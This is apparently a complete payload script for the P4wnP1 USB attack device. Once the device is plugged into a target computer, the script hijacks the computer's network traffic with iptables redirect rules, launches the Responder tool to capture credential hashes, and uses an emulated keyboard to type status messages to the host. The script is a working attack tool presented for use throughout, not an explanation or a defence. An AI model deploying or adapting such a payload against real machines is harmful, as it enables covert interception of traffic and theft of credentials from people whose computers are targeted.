echo "Payload1 included"

function onNetworkUp()
{
	echo "Network up"
	echo "Active device $active_interface"
	echo "P4wnP1 IP $IF_IP"
	echo "P4wnP1 netmask $IF_MASK"


     	# redirect all traffic meant to be routed out through the P4wnP1 to localhost (127.0.0.1)
        #       this for example fetches traffic to DNS servers, which aren't overwritten by our DHCP lease
        #       an UDP request to 8.8.4.4:53 from our target would end up here on 127.0.0.1:53, thanks to
        #       the static routes for 0.0.0.0/1 and 128.0.0.0/1
        iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
        iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT

	#start responder in screen
        screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"

	touch /tmp/responder_started

	# print Network is running via Keyboard to host
	echo "Network is running" | outhid
}

function onTargetGotIP()
{
	echo "DHCP Lease given to target"
	echo "Target IP $target_ip"

        # add route back through target (for ICS)
        route add -net default gw $target_ip

	# add DNS entry for google DNS
	echo nameserver 8.8.8.8 > /etc/resolv.conf

}

function onBootFinished()
{
	# we should land here even if no RNDIS / CDC ECM is enabled
	# as long as P4wnP1 gets connected to a target host

	# print "Boot finished" via HID keyboard (languag layoute selected in setup.cfg)
	echo "Boot finished" | outhid
}

# commands in this function are ran on user login
# the commans are ran by user "pi"
function onLogin()
{
	echo "Waiting for responder to be started before attaching to screen session"
	echo "Press <CTRL> + <C> to abort waiting"
	while [ ! -f /tmp/responder_started ]; do
		printf "."
		sleep 0.5
	done

	sudo screen -d -r	
}
